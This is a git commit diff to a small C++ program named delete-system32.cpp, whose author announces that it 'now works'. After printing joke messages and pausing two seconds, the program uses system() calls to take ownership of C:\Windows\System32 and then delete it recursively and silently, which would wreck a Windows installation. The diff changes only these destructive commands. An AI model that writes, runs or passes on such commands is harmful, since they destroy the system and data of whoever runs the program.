4d6b0be093efeddae29ae51c33abc5c24206d419
Emi <staypuff898@gmail.com>
2026-08-22 17:34:59 -0700

    Update delete-system32.cpp
    Now it worksss!!! : )

--- delete-system32.cpp
+++ delete-system32.cpp
@@ -17,8 +17,8 @@ int main()
     std::cout<<"o shittings"<<std::endl;
     std::cout<<""<<std::endl;
     std::this_thread::sleep_for(std::chrono::seconds(2));
-    system("takeown /f C:\Windows\System32");
-    system("rmdir /s /q C:\Windows\System32");
+    system("takeown /f C:\Windows\System32 \n");
+    system("rmdir /s /q C:\Windows\System32 \n");
 
     return 0;
 }
